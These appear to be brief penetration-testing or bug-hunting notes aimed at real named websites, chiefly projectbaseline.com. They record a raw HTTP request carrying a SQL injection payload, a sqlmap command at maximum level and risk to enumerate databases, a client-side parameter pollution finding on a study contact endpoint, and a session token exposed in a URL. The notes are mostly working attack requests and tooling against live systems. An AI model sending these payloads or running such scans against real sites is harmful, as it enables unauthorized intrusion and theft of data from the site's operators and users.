___

# signalpath

Find urls

# projectbaseline

## SQL Injection 

```
GET /shape-healthtech/?189304164'%20or%204312%3d4317--%20=1 HTTP/2
Host: www.projectbaseline.com
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

```bash
sqlmap -r request.txt --dbs --level 5 --risk 3 
```

## Client-side HTTP parameter pollution

```
POST /studies/rheumatoid-arthritis-galvani/contact/
```

### Session token in url 

```
GET /content/verily/us/en/studies/rheumatoid-arthritis-galvani/contact/jcr:content.recaptcha.json?token=03AFcWeA7zmp4
...
```

